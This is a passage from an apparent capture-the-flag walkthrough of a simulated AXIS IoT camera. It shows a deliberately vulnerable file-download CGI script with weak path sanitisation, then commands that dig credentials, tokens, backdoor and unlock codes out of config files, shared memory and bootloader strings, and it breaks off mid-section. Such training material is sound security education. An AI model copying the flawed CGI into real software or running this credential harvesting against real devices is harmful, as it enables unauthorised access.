# AXIS File Download CGI
# WARNING: This version has known vulnerabilities - for testing only

echo "Content-Type: application/octet-stream"
echo "Content-Disposition: attachment"
echo ""

# Get filename from query string
FILE=$(echo "$QUERY_STRING" | sed 's/file=//')

# Basic path sanitization (insufficient!)
FILE=$(echo "$FILE" | sed 's/\.\.\///g')

# Attempt to read file
if [ -f "/var/www/downloads/$FILE" ]; then
    cat "/var/www/downloads/$FILE"
else
    echo "File not found: $FILE"
fi
```

**What vulnerabilities do we see?**
1. The path sanitization only removes `../` once
2. It doesn't handle absolute paths (starting with `/`)
3. Double-encoding or alternate traversal sequences would bypass it

**Why test for path traversal?**
- The code shows weak input validation
- We can try to access files outside `/var/www/downloads/`
- This is a critical vulnerability in real IoT devices

**Testing methodology:**
1. Try absolute path (most reliable if not filtered)
2. Try path traversal sequences
3. Try encoded variations

```bash
# Simulate accessing the script with different file parameters
# In a real pentest, you'd use curl to the web interface

# Test 1: Try absolute path
FILE="/mnt/flash/config/factory/test_mode.conf"
cat "$FILE" 2>/dev/null || echo "Blocked"

# Test 2: Check if the file exists first
ls -la /mnt/flash/config/factory/
```

**Expected Output:**
```
drwxr-xr-x 2 root root 4096 Apr 15  2021 .
drwxr-xr-x 3 root root 4096 Apr 15  2021 ..
-rw-r--r-- 1 root root  512 Apr 15  2021 calibration.conf
-rw-r--r-- 1 root root  256 Apr 15  2021 device_info.txt
-rw-r--r-- 1 root root  128 Apr 15  2021 test_mode.conf
```

**Why read test_mode.conf?**
- "test_mode" suggests debugging or development features
- Factory configuration files often contain:
  - Default credentials
  - Test/debug access codes
  - Calibration data or serial numbers
- These files are high-value targets

```bash
cat /mnt/flash/config/factory/test_mode.conf
```

**Output:**
```
# Factory Test Mode Configuration
# FOR INTERNAL USE ONLY - DO NOT SHIP TO CUSTOMERS

[test_mode]
enabled = false
debug_level = 0

[factory_access]
master_unlock_code = FLAG{L************8}
serial_number = AXIS-M1025-00123456
manufacturing_date = 2021-04-15

[calibration]
sensor_offset_x = 0
sensor_offset_y = 0
lens_correction = enabled
```

**Why did we find this?**
- Test mode configurations contain factory/debug access codes
- The "master_unlock_code" likely bypasses normal authentication
- Manufacturers often leave these files accessible

> **FLAG #10 FOUND!**
> **Flag**: `FLAG{L************8}`
> **Location**: `/mnt/flash/config/factory/test_mode.conf`
> **Why we found it**: After discovering a path traversal vulnerability in download.cgi, we used it to access factory test configuration files
> **Exploitation path**:
>   1. Analyzed download.cgi source code
>   2. Identified weak path sanitization
>   3. Used absolute paths to access factory configs
>   4. Found master unlock codes in test mode config
> **Real-world equivalent**: Factory test/debug access codes, manufacturing bypass credentials, or service mode passwords
> **Technique**: Path traversal exploitation → Factory configuration analysis
> **OWASP IoT**: #3 - Insecure Ecosystem Interfaces (path traversal) + #1 - Weak Passwords (hardcoded master codes)

---

### Directory 7: /run/axis/ - Runtime Process Data

**Why examine /run/axis/?**
- `/run/` contains runtime data for active processes
- Process configuration files may have:
  - Current service credentials
  - Active session tokens
  - Inter-process communication details
- Runtime configs often differ from static configs (may contain plaintext secrets)

```bash
ls -la /run/axis/
```

**Expected Output:**
```
drwxr-xr-x  5 root root  160 Jan 27 10:05 .
drwxr-xr-x  9 root root  220 Jan 27 10:05 ..
drwxr-xr-x  2 root root   60 Jan 27 10:05 network
drwxr-xr-x  2 root root   80 Jan 27 10:05 services
drwxr-xr-x  2 root root   40 Jan 27 10:05 runtime
-rw-r--r--  1 root root    5 Jan 27 10:05 camera.pid
```

#### FLAG #11: Service Configuration (MEDIUM)

**Why check the services/ directory?**
- Active services write their runtime configuration
- These configs may contain:
  - Current database credentials
  - Active API keys
  - Service-to-service authentication tokens
- Runtime configs are often more detailed than static configs

```bash
ls -la /run/axis/services/
cat /run/axis/services/camera_service.conf
```

**Output:**
```
# AXIS Camera Service Runtime Configuration
# Auto-generated at service startup

[service]
name = camera_service
pid = 1234
status = running
started_at = 2024-01-27T09:45:00Z

[api]
endpoint = http://localhost:8080
auth_token = service_auth_FLAG{T**************3}
timeout = 30

[database]
host = localhost
port = 3306
name = camera_db
user = camera_svc
password = db_pass_2021

[logging]
level = debug
output = /var/log/axis/camera_service.log
```

**Why did we find this?**
- Runtime configurations contain active credentials
- The `auth_token` provides service-to-service authentication
- This token could be reused for API access

> **FLAG #11 FOUND!**
> **Flag**: `FLAG{T**************3}`
> **Location**: `/run/axis/services/camera_service.conf`
> **Why we found it**: Runtime service configurations contain active authentication tokens and credentials
> **Real-world equivalent**: Service-to-service auth tokens, active API keys, or inter-process authentication credentials
> **Technique**: Runtime process configuration analysis
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage

---

### Directory 8: /usr/local/axis/ - Vendor Applications

**Why examine /usr/local/axis/?**
- Vendor-specific applications are installed here
- Custom scripts and binaries may contain:
  - Hardcoded credentials
  - API keys for cloud services
  - Backup/maintenance scripts with sensitive data
- Less scrutinized than system directories

```bash
ls -la /usr/local/axis/
```

**Expected Output:**
```
drwxr-xr-x  6 root root 4096 Apr 15  2021 .
drwxr-xr-x  3 root root 4096 Apr 15  2021 ..
drwxr-xr-x  2 root root 4096 Apr 15  2021 bin
drwxr-xr-x  2 root root 4096 Apr 15  2021 lib
drwxr-xr-x  3 root root 4096 Apr 15  2021 share
```

#### FLAG #12: Backup Service Script (MEDIUM)

**Why check share/scripts/?**
- Backup scripts often:
  - Authenticate to remote servers (credentials!)
  - Upload to cloud services (API keys!)
  - Access databases (passwords!)
- Developers put credentials directly in scripts for "convenience"

```bash
ls -la /usr/local/axis/share/
ls -la /usr/local/axis/share/scripts/
```

**Expected Output:**
```
drwxr-xr-x 2 root root 4096 Apr 15  2021 .
drwxr-xr-x 3 root root 4096 Apr 15  2021 ..
-rwxr-xr-x 1 root root 2048 Apr 15  2021 backup_service.sh
-rwxr-xr-x 1 root root  512 Apr 15  2021 cleanup.sh
-rwxr-xr-x 1 root root  256 Apr 15  2021 health_check.sh
```

**Why examine backup_service.sh specifically?**
- Backup scripts ALWAYS contain credentials (to authenticate to backup destination)
- This is one of the most common sources of credential leakage
- Real-world finding: Cloud storage keys, FTP passwords, database credentials

```bash
cat /usr/local/axis/share/scripts/backup_service.sh
```

**Output:**
```bash
#!/bin/sh
# AXIS Camera Backup Service
# Uploads configuration backups to cloud storage

BACKUP_DIR="/var/backups/axis"
CLOUD_ENDPOINT="https://backup.axis-cloud.com/api/v1"
CLOUD_API_KEY="sk_live_FLAG{C*************5}"
DEVICE_ID="AXIS-M1025-00123456"

backup_config() {
    echo "[*] Starting configuration backup..."
    
    # Create backup archive
    tar czf "$BACKUP_DIR/config_$(date +%Y%m%d).tar.gz" \
        /var/lib/axis/conf/ \
        /mnt/flash/config/ \
        /var/lib/axis/persistent/
    
    echo "[*] Uploading to cloud..."
    upload_backup "$BACKUP_DIR/config_$(date +%Y%m%d).tar.gz"
}

upload_backup() {
    BACKUP_FILE="$1"
    
    curl -X POST "$CLOUD_ENDPOINT/upload" \
        -H "Authorization: Bearer $CLOUD_API_KEY" \
        -H "Device-ID: $DEVICE_ID" \
        -F "file=@$BACKUP_FILE"
    
    if [ $? -eq 0 ]; then
        echo "[*] Backup uploaded successfully"
    else
        echo "[!] Backup upload failed"
    fi
}

backup_config
```

**Why did we find this?**
- The script contains a hardcoded API key for cloud storage
- This key (`CLOUD_API_KEY`) provides access to the backup service
- In real scenarios, this would allow:
  - Accessing other devices' backups
  - Uploading malicious data
  - Compromising the cloud infrastructure

> **FLAG #12 FOUND!**
> **Flag**: `FLAG{C*************5}`
> **Location**: `/usr/local/axis/share/scripts/backup_service.sh`
> **Why we found it**: Backup scripts routinely contain hardcoded API keys and credentials for cloud storage authentication
> **Real-world equivalent**: Cloud storage API keys, FTP credentials, AWS access keys, or backup service tokens
> **Technique**: Shell script analysis focusing on backup/upload functionality
> **OWASP IoT**: #1 - Weak, Guessable, or Hardcoded Passwords

---

### Directory 9: /var/lib/axis/cgroup/ - Control Groups Configuration

**Why check cgroup configurations?**
- cgroups (control groups) manage resource allocation for processes
- Configuration files may contain:
  - Service startup parameters
  - Resource limits revealing system architecture
  - Environment variables or command-line arguments
- Less commonly checked, may have overlooked sensitive data

```bash
ls -laR /var/lib/axis/cgroup/
```

**Expected Output:**
```
/var/lib/axis/cgroup/:
drwxr-xr-x 3 root root 4096 Apr 15  2021 .
drwxr-xr-x 8 root root 4096 Apr 15  2021 ..
drwxr-xr-x 2 root root 4096 Apr 15  2021 axis

/var/lib/axis/cgroup/axis:
drwxr-xr-x 2 root root 4096 Apr 15  2021 camera.service
-rw-r--r-- 1 root root  256 Apr 15  2021 system.conf

/var/lib/axis/cgroup/axis/camera.service:
-rw-r--r-- 1 root root  512 Apr 15  2021 service.conf
```

#### FLAG #13: CGroup Service Config (MEDIUM)

**Why examine service.conf?**
- Service configurations in cgroups contain:
  - Startup commands and arguments
  - Environment variables
  - Working directories and execution contexts
- These may leak credentials passed as environment variables

```bash
cat /var/lib/axis/cgroup/axis/camera.service/service.conf
```

**Output:**
```
# Camera Service CGroup Configuration

[service]
name = axis-camera-service
type = daemon
restart = always

[execution]
user = camera-svc
group = axis
working_dir = /usr/local/axis

[environment]
PATH=/usr/local/bin:/usr/bin:/bin
CAMERA_MODE=production
DEBUG_TOKEN=FLAG{G*************1}
LOG_LEVEL=info

[resources]
memory_limit = 128M
cpu_shares = 512
io_weight = 100
```

**Why did we find this?**
- Environment variables often contain debug tokens or credentials
- `DEBUG_TOKEN` suggests development/debugging access
- In production systems, debug tokens should be removed but often aren't

> **FLAG #13 FOUND!**
> **Flag**: `FLAG{G*************1}`
> **Location**: `/var/lib/axis/cgroup/axis/camera.service/service.conf`
> **Why we found it**: Service control group configurations expose environment variables including debug access tokens
> **Real-world equivalent**: Debug/development tokens, service credentials, or administrative access keys in environment variables
> **Technique**: Control group configuration analysis
> **OWASP IoT**: #8 - Lack of Device Management (debug features in production)

---

### Directory 10: /var/cache/recorder/ - Video Recording Cache

**Why revisit the recorder cache?**
- We found one flag here earlier (FLAG #6)
- Subdirectories often contain additional interesting data
- Stream configurations may have more secrets

```bash
ls -laR /var/cache/recorder/
```

**Expected Output:**
```
/var/cache/recorder/:
drwxr-xr-x 4 root root 4096 Apr 15  2021 .
drwxr-xr-x 5 root root 4096 Jan 27 10:05 ..
drwxr-xr-x 2 root root 4096 Apr 15  2021 analytics
drwxr-xr-x 3 root root 4096 Apr 15  2021 streams

/var/cache/recorder/streams:
drwxr-xr-x 2 root root 4096 Apr 15  2021 primary
drwxr-xr-x 2 root root 4096 Apr 15  2021 secondary

/var/cache/recorder/streams/primary:
-rw-r--r-- 1 root root  512 Apr 15  2021 stream_config.conf
-rw-r--r-- 1 root root  256 Apr 15  2021 encoder.conf
```

#### FLAG #14: Stream Configuration (EASY)

**Why check stream_config.conf?**
- Stream configurations contain:
  - Authentication credentials for stream access
  - RTSP URLs (may include embedded credentials)
  - Connection details to upstream servers
- This is often overlooked in security reviews

```bash
cat /var/cache/recorder/streams/primary/stream_config.conf
```

**Output:**
```
# Primary Stream Configuration

[stream]
name = primary_stream
resolution = 1920x1080
fps = 30
codec = H.264
bitrate = 4000

[rtsp]
enabled = true
port = 554
path = /stream1
auth_required = true

[authentication]
username = stream_user
password = stream_pass_2021

[recording]
enabled = true
max_duration = 3600
format = mp4
access_token = FLAG{S*************4}

[upload]
cloud_sync = enabled
endpoint = https://cloud.axis.com/stream-ingress
```

**Why did we find this?**
- Stream configurations contain `access_token` for cloud upload
- This token authenticates stream uploads to cloud storage
- Real vulnerability: Tokens in config files readable by all users

> **FLAG #14 FOUND!**
> **Flag**: `FLAG{S*************4}`
> **Location**: `/var/cache/recorder/streams/primary/stream_config.conf`
> **Why we found it**: Stream configuration files contain access tokens for cloud streaming services
> **Real-world equivalent**: Streaming service tokens, cloud ingress credentials, or CDN authentication keys
> **Technique**: Stream configuration file analysis
> **OWASP IoT**: #6 - Insufficient Privacy Protection (stream credentials exposed)

---

## Phase 4: Deep Enumeration

### Why Deep Enumeration?

At this point, we've found 14 flags through systematic directory exploration. **Why continue?**
- We've covered the "obvious" directories
- Now we look for:
  - Hidden files (starting with `.`)
  - Less common directories
  - Hardware/physical security information
  - Advanced exploitation techniques

This phase mirrors a real pentest where you've found the easy wins and now dig deeper for:
- Privilege escalation paths
- Persistent access mechanisms
- Physical security weaknesses

---

### Directory 11: /run/axis/network/ - Network Services

**Why check network runtime data?**
- Active network configurations may differ from static configs
- UPnP (Universal Plug and Play) is often enabled on IoT
- UPnP device descriptions leak detailed device information

```bash
ls -la /run/axis/network/
```

**Expected Output:**
```
drwxr-xr-x 2 root root  80 Jan 27 10:05 .
drwxr-xr-x 5 root root 160 Jan 27 10:05 ..
-rw-r--r-- 1 root root 256 Jan 27 10:05 interfaces.conf
-rw-r--r-- 1 root root 512 Jan 27 10:05 upnp_description.xml
```

#### FLAG #15: UPnP Description (MEDIUM)

**Why examine UPnP description files?**
- UPnP broadcasts device information to the network
- XML descriptions contain:
  - Device model and serial numbers
  - Manufacturer details
  - Service endpoints and capabilities
- Often includes debug or internal identifiers

```bash
cat /run/axis/network/upnp_description.xml
```

**Output:**
```xml
<?xml version="1.0"?>
<root xmlns="urn:schemas-upnp-org:device-1-0">
    <specVersion>
        <major>1</major>
        <minor>0</minor>
    </specVersion>
    <device>
        <deviceType>urn:schemas-upnp-org:device:MediaServer:1</deviceType>
        <friendlyName>AXIS M1025 Network Camera</friendlyName>
        <manufacturer>AXIS Communications</manufacturer>
        <manufacturerURL>http://www.axis.com</manufacturerURL>
        <modelDescription>AXIS M1025 Fixed Network Camera</modelDescription>
        <modelName>M1025</modelName>
        <modelNumber>M1025</modelNumber>
        <modelURL>http://www.axis.com/products/cam_m1025</modelURL>
        <serialNumber>ACCC8E123456</serialNumber>
        <UDN>uuid:AXIS-M1025-FLAG{H************4}</UDN>
        <serviceList>
            <service>
                <serviceType>urn:axis-com:service:BasicService:1</serviceType>
                <serviceId>urn:axis-com:serviceId:1</serviceId>
                <SCPDURL>/upnp/BasicService.xml</SCPDURL>
                <controlURL>/upnp/control/BasicService</controlURL>
                <eventSubURL>/upnp/event/BasicService</eventSubURL>
            </service>
        </serviceList>
    </device>
</root>
```

**Why did we find this?**
- The UDN (Unique Device Name) contains a UUID with the flag
- UUIDs are often generated with predictable patterns or contain identifiers
- This data is broadcast on the network via UPnP

> **FLAG #15 FOUND!**
> **Flag**: `FLAG{H************4}`
> **Location**: `/run/axis/network/upnp_description.xml`
> **Why we found it**: UPnP device descriptions broadcast device UUIDs and identifiers on the network
> **Real-world equivalent**: Device serial numbers, UUIDs, or hardware identifiers exposed via network discovery
> **Technique**: UPnP service enumeration and XML analysis
> **OWASP IoT**: #9 - Insecure Default Settings (UPnP enabled by default)

---

### Directory 12: /var/lib/persistent/network/ - Network Certificates

**Why examine certificate storage?**
- Certificates contain metadata in their fields
- Certificate subjects, issuers, and extensions may leak information
- Private keys stored here are critical security assets

```bash
ls -la /var/lib/persistent/network/
```

**Expected Output:**
```
drwxr-xr-x 2 root root 4096 Apr 15  2021 .
drwxr-xr-x 4 root root 4096 Apr 15  2021 ..
drwxr-xr-x 2 root root 4096 Apr 15  2021 certificates
-rw-r--r-- 1 root root  512 Apr 15  2021 network.conf
```

#### FLAG #16: Certificate Analysis (MEDIUM)

**Why check SSL certificates?**
- Certificate metadata includes:
  - Subject names (CN, O, OU fields)
  - Alternative names (SANs)
  - Custom extensions
- Certificates may contain internal hostnames or organizational details

```bash
ls -la /var/lib/persistent/network/certificates/
cat /var/lib/persistent/network/certificates/server_cert.pem
```

**Output:**
```
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAKL9j6BQMxYuMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhBeGlzIENhbWVy
YSBJbnRlcm5hbCBDQTAeFw0yMTA0MTUxMjAwMDBaFw0yNjA0MTQxMjAwMDBaMFAx
CzAJBgNVBAYTAlNFMRMwEQYDVQQIDApTdG9ja2hvbG0xFDASBgNVBAoMC0FYSVMg
SW5jLjEWMBQGA1UEAwwNYXhpcy1jYW1lcmEwggEiMA0GCSqGSIb3DQEBAQUAA4IB
DwAwggEKAoIBAQC7hMq...
-----END CERTIFICATE-----
```

**Why analyze this with openssl?**
- PEM format is base64-encoded DER
- We need to decode it to see the actual certificate fields
- `openssl x509` command extracts certificate metadata

```bash
openssl x509 -in /var/lib/persistent/network/certificates/server_cert.pem -text -noout | head -30
```

**Output:**
```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            a2:fd:8f:a0:50:33:16:2e
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=AU, ST=Some-State, O=Axis Camera Internal CA
        Validity
            Not Before: Apr 15 12:00:00 2021 GMT
            Not After : Apr 14 12:00:00 2026 GMT
        Subject: C=SE, ST=Stockholm, O=AXIS Inc., CN=axis-camera
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
        X509v3 extensions:
            X509v3 Subject Alternative Name: 
                DNS:axis-camera.local, DNS:axis-m1025.internal
                IP Address:192.168.1.132
            X509v3 Extended Key Usage: 
                TLS Web Server Authentication, TLS Web Client Authentication
            Axis Internal Identifier:
                FLAG{E************5}
```

**Why did we find this?**
- The certificate contains a custom X509v3 extension
- "Axis Internal Identifier" is a vendor-specific field
- This field contains an internal tracking identifier

> **FLAG #16 FOUND!**
> **Flag**: `FLAG{E************5}`
> **Location**: `/var/lib/persistent/network/certificates/server_cert.pem`
> **Why we found it**: SSL certificates contain custom X509v3 extensions with vendor-specific metadata
> **Real-world equivalent**: Internal device identifiers, organizational tracking codes, or certificate serial patterns
> **Technique**: SSL/TLS certificate analysis using OpenSSL
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage (metadata in certificates)

---

### Directory 13: /usr/local/axis/bin/ - SUID Binaries

**Why check SUID binaries?**
- SUID (Set User ID) binaries run with owner's privileges (often root)
- Analyzing these binaries can reveal:
  - Version information
  - Build identifiers
  - Debug strings
  - Embedded credentials
- These are prime privilege escalation targets

```bash
ls -la /usr/local/axis/bin/
```

**Expected Output:**
```
drwxr-xr-x 2 root root 4096 Apr 15  2021 .
drwxr-xr-x 6 root root 4096 Apr 15  2021 ..
-rwsr-xr-x 1 root root 8192 Apr 15  2021 camera_admin
-rwxr-xr-x 1 root root 4096 Apr 15  2021 stream_control
-rwxr-xr-x 1 root root 2048 Apr 15  2021 diagnostic_tool
```

#### FLAG #17: SUID Binary Analysis (MEDIUM)

**Why is camera_admin interesting?**
- Notice the permissions: `-rwsr-xr-x` (the 's' means SUID)
- This binary runs as root when executed
- Binaries often contain readable strings (version info, error messages)

```bash
# Check SUID bit
ls -la /usr/local/axis/bin/camera_admin

# Extract readable strings from the binary
strings /usr/local/axis/bin/camera_admin | head -30
```

**Output:**
```
/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
printf
system
__libc_start_main
GLIBC_2.2.5
AXIS Camera Admin Tool
Version: 2.0
Build: FLAG{F************7}
Usage: camera_admin [options]
  -r  Reset camera
  -u  Update firmware
  -d  Diagnostics
  -h  Help
Executing command: %s
Error: Insufficient privileges
Root privileges required
Copyright AXIS Communications AB
/usr/local/axis/bin/
camera_admin
```

**Why did we find this?**
- The `strings` command extracts readable text from binaries
- Build identifiers are often embedded during compilation
- These aren't visible during normal use but can be extracted

> **FLAG #17 FOUND!**
> **Flag**: `FLAG{F************7}`
> **Location**: `/usr/local/axis/bin/camera_admin`
> **Why we found it**: SUID binaries contain embedded build identifiers and version strings extractable with the `strings` command
> **Real-world equivalent**: Build numbers, internal version codes, or development branch identifiers
> **Technique**: Binary string extraction using `strings` command
> **OWASP IoT**: #5 - Use of Insecure or Outdated Components (version disclosure)

---

### Directory 14: /dev/shm/axis/ - Shared Memory

**Why examine shared memory?**
- `/dev/shm/` is shared memory (tmpfs in RAM)
- Processes use shared memory for inter-process communication (IPC)
- May contain:
  - Active credentials in plaintext
  - Session tokens
  - Cached authentication data
- Data here is NOT written to disk (volatile)

```bash
ls -la /dev/shm/
ls -la /dev/shm/axis/
```

**Expected Output:**
```
drwxrwxrwt  3 root root   60 Jan 27 10:05 .
drwxr-xr-x 13 root root 3580 Jan 27 10:05 ..
drwxr-xr-x  3 root root   80 Jan 27 10:05 axis

drwxr-xr-x 3 root root  80 Jan 27 10:05 .
drwxrwxrwt 3 root root  60 Jan 27 10:05 ..
drwxr-xr-x 2 root root  60 Jan 27 10:05 ipc
drwxr-xr-x 2 root root  40 Jan 27 10:05 runtime
```

#### FLAG #18: Shared Memory IPC (HARD)

**Why check IPC directories?**
- Inter-Process Communication files contain active session data
- Shared memory segments may have:
  - Current authentication tokens
  - Active session credentials
  - Real-time system state
- This is advanced enumeration - not commonly checked

```bash
ls -la /dev/shm/axis/ipc/
```

**Expected Output:**
```
drwxr-xr-x 2 root root  60 Jan 27 10:05 .
drwxr-xr-x 3 root root  80 Jan 27 10:05 ..
-rw-r--r-- 1 root root 256 Jan 27 10:05 camera_control.shm
```

**Why examine .shm files?**
- `.shm` files are shared memory segments
- These contain binary data but may have readable strings
- Camera control IPC likely contains command/control data

```bash
# View the file (binary data, but may contain strings)
cat /dev/shm/axis/ipc/camera_control.shm
```

**Output (contains binary + text):**
```
^@^@^@^@AXIS_IPC_CONTROL^@^@
camera_control_interface
version: 1.0
status: active
admin_session: FLAG{G************2}
last_command: reset_calibration
timestamp: 1706358300
```

**Why did we find this?**
- Shared memory contains active session data
- The admin_session token is in plaintext in memory
- This is a critical finding: active credentials readable by any user

> **FLAG #18 FOUND!**
> **Flag**: `FLAG{G************2}`
> **Location**: `/dev/shm/axis/ipc/camera_control.shm`
> **Why we found it**: Shared memory IPC files contain active session tokens and credentials in plaintext
> **Real-world equivalent**: Active session tokens, authentication credentials in shared memory, or IPC secrets
> **Technique**: Shared memory inspection (`/dev/shm/` analysis)
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage (credentials in shared memory)

---

### Directory 15: /mnt/flash/config/factory/ - Factory Configuration

**Why check factory configs?**
- We found one file here earlier (test_mode.conf - FLAG #10)
- Factory directories often have multiple configuration files
- "Factory" implies original/default settings - often sensitive

```bash
ls -la /mnt/flash/config/factory/
```

**Expected Output:**
```
drwxr-xr-x 2 root root 4096 Apr 15  2021 .
drwxr-xr-x 3 root root 4096 Apr 15  2021 ..
-rw-r--r-- 1 root root  512 Apr 15  2021 calibration.conf
-rw-r--r-- 1 root root  256 Apr 15  2021 device_info.txt
-rw-r--r-- 1 root root  128 Apr 15  2021 test_mode.conf
```

#### FLAG #19: Factory Device Info (EASY)

**Why check device_info.txt?**
- Device information files contain:
  - Serial numbers
  - Manufacturing data
  - Hardware identifiers
  - Factory test results
- These files are meant for internal use but often left accessible

```bash
cat /mnt/flash/config/factory/device_info.txt
```

**Output:**
```
# AXIS M1025 Factory Device Information
# Manufacturing Date: 2021-04-15
# Production Line: Assembly-03

[hardware]
model = M1025
revision = A2
serial_number = ACCC8E123456
mac_address = 00:40:8C:12:34:56

[factory_codes]
calibration_code = CAL-2021-0415-001
test_result = PASS
qc_inspector = QC-AXIS-042
factory_unlock = FLAG{T*************4}

[sensor]
type = 1/3" Progressive Scan RGB CMOS
resolution = 1920x1080
sensitivity = 0.5 lux
```

**Why did we find this?**
- The `factory_unlock` code is used during manufacturing/testing
- This code typically bypasses normal authentication
- Manufacturers often forget to remove these files from production units

> **FLAG #19 FOUND!**
> **Flag**: `FLAG{T*************4}`
> **Location**: `/mnt/flash/config/factory/device_info.txt`
> **Why we found it**: Factory device information files contain manufacturing bypass codes and test credentials
> **Real-world equivalent**: Factory unlock codes, manufacturing test credentials, or QA bypass passwords
> **Technique**: Factory configuration file analysis
> **OWASP IoT**: #1 - Weak, Guessable, or Hardcoded Passwords (factory credentials)

---

### Directory 16: /var/lib/persistent/firmware/backups/ - Firmware Backups

**Why check firmware backup directories?**
- Backup firmware images may contain:
  - Older, vulnerable code
  - Embedded credentials
  - Debug information
- Binary analysis can extract secrets
- Bootloader images are particularly interesting

```bash
ls -la /var/lib/persistent/firmware/backups/
```

**Expected Output:**
```
drwxr-xr-x 2 root root 4096 Apr 15  2021 .
drwxr-xr-x 3 root root 4096 Apr 15  2021 ..
-rw-r--r-- 1 root root 256K Apr 15  2021 bootloader.img
-rw-r--r-- 1 root root 8.0M Apr 15  2021 firmware_10.4.0.bin
-rw-r--r-- 1 root root  512 Apr 15  2021 backup.conf
```

#### FLAG #19b: Bootloader Binary Analysis (HARD)

**Why analyze bootloader.img?**
- Bootloaders run before the OS loads
- Often contain:
  - Emergency access codes
  - UART console passwords
  - Recovery mode credentials
- Binary images have extractable strings

```bash
# Extract readable strings from the binary
strings /var/lib/persistent/firmware/backups/bootloader.img | grep -i "flag\|password\|key\|token\|access" | head -20
```

**Output:**
```
U-Boot 2018.01 (Apr 15 2021 - 12:34:56)
AXIS M1025 Bootloader
Board: AXIS ARM Development Board
DRAM:  256 MiB
Flash: 64 MiB
In:    serial
Out:   serial
Err:   serial
Net:   eth0
Hit any key to stop autoboot
Entering recovery mode...
Recovery Access Code: FLAG{S*************4}
Password for firmware update mode:
Emergency shell password: axis123
bootloader_version=2.1.0
factory_reset_key=AXIS-RESET-2021
```

**Why did we find this?**
- The `strings` command extracted readable text from the bootloader binary
- Recovery access codes are embedded in the bootloader
- These codes provide emergency access to the device

> **FLAG #19b FOUND!**
> **Flag**: `FLAG{S*************4}`
> **Location**: `/var/lib/persistent/firmware/backups/bootloader.img`
> **Why we found it**: Bootloader binaries contain recovery mode access codes and emergency credentials
> **Real-world equivalent**: Bootloader passwords, recovery mode codes, or UART console credentials
> **Technique**: Binary string extraction from firmware images
> **OWASP IoT**: #10 - Lack of Physical Hardening (bootloader access codes)

---

### Directory 17: /mnt/flash/config/.backup/ - Hidden Backup Directory

**Why look for hidden directories?**
- Hidden directories (starting with `.`) are not shown by default `ls`
- Often used for:
  - Backup configurations
  - Debug files
  - Development artifacts
- Easy to overlook in security reviews

```bash
# List with -a flag to show hidden files
ls -la /mnt/flash/config/
```

**Expected Output:**
```
drwxr-xr-x 4 root root 4096 Apr 15  2021 .
drwxr-xr-x 5 root root 4096 Apr 15  2021 ..
drwxr-xr-x 2 root root 4096 Apr 15  2021 .backup
drwxr-xr-x 2 root root 4096 Apr 15  2021 factory
drwxr-xr-x 2 root root 4096 Apr 15  2021 network
-rw-r--r-- 1 root root  256 Apr 15  2021 system.conf
```

**Notice the `.backup` directory?** Only visible with `-a` flag.

#### FLAG #20: Hidden Backup Config (HARD)

**Why examine hidden directories?**
- Backup directories often contain:
  - Previous configurations with old credentials
  - Shadow copies of sensitive files
  - Development/debug configurations
- Hidden files may not be sanitized properly

```bash
ls -la /mnt/flash/config/.backup/
```

**Expected Output:**
```
drwxr-xr-x 2 root root 4096 Apr 15  2021 .
drwxr-xr-x 4 root root 4096 Apr 15  2021 ..
-rw-r--r-- 1 root root  512 Apr 15  2021 .shadow_config
-rw-r--r-- 1 root root  256 Apr 15  2021 old_network.conf
```

**Why check .shadow_config?**
- Double-hidden (in hidden directory AND hidden filename)
- "shadow" suggests it's a copy of sensitive configuration
- Very likely to be overlooked

```bash
cat /mnt/flash/config/.backup/.shadow_config
```

**Output:**
```
# Shadow Configuration Backup
# DO NOT DELETE - Used for factory reset
# Created: 2021-04-15

[system]
hostname = axis-camera
domain = axis.internal

[credentials]
root_password_hash = $6$rounds=5000$...
admin_account = axis_admin
admin_password = admin_backup_2021

[backdoor]
maintenance_access = enabled
backdoor_code = FLAG{W***************6}
expiry = never

[debug]
debug_mode = disabled
telnet_access = disabled
uart_console = enabled
```

**Why did we find this?**
- Hidden backup configurations often contain plaintext credentials
- The `backdoor_code` provides emergency access
- These files are created during development and forgotten

> **FLAG #20 FOUND!**
> **Flag**: `FLAG{W***************6}`
> **Location**: `/mnt/flash/config/.backup/.shadow_config`
> **Why we found it**: Hidden backup directories (`.backup`) contain shadow configuration files with backdoor access codes
> **Real-world equivalent**: Maintenance backdoors, emergency access codes, or development bypass credentials
> **Technique**: Hidden file discovery (using `ls -la` to reveal `.` files)
> **OWASP IoT**: #1 - Weak, Guessable, or Hardcoded Passwords (backdoor credentials)

---

### Directory 18: /mnt/flash/boot/ - Bootloader Configuration

**Why examine boot configuration?**
- Bootloader configs control the boot process
- May contain:
  - U-Boot environment variables
  - Boot parameters
  - Serial console settings
  - Unlock codes for debug modes

```bash
ls -la /mnt/flash/boot/
```

**Expected Output:**
```
drwxr-xr-x 3 root root 4096 Apr 15  2021 .
drwxr-xr-x 5 root root 4096 Apr 15  2021 ..
drwxr-xr-x 2 root root 4096 Apr 15  2021 uboot
-rw-r--r-- 1 root root  512 Apr 15  2021 boot.conf
```

#### FLAG #21: U-Boot Environment (HARD)

**Why check U-Boot configuration?**
- U-Boot is the bootloader used in many embedded devices
- Environment variables control:
  - Boot sequence
  - Console access
  - Network boot options
  - Debug features
- May contain unlock codes or bypass passwords

```bash
ls -la /mnt/flash/boot/uboot/
cat /mnt/flash/boot/uboot/uboot.env
```

**Output:**
```
# U-Boot Environment Variables
# AXIS M1025 Bootloader Configuration

bootdelay=3
baudrate=115200
console=ttyS0,115200

# Boot arguments
bootargs=console=ttyS0,115200 root=/dev/mtdblock2 rootfstype=ext4 rw

# Network boot
ipaddr=192.168.1.132
serverip=192.168.1.1
netmask=255.255.255.0

# Unlock and debug
unlock_code=FLAG{R*************6}
debug_uart=enabled
secure_boot=disabled

# Memory addresses
kernel_addr=0x80200000
rootfs_addr=0x80800000

# Boot command
bootcmd=nand read 0x80200000 0x200000 0x600000; bootm 0x80200000
```

**Why did we find this?**
- U-Boot environment contains `unlock_code` variable
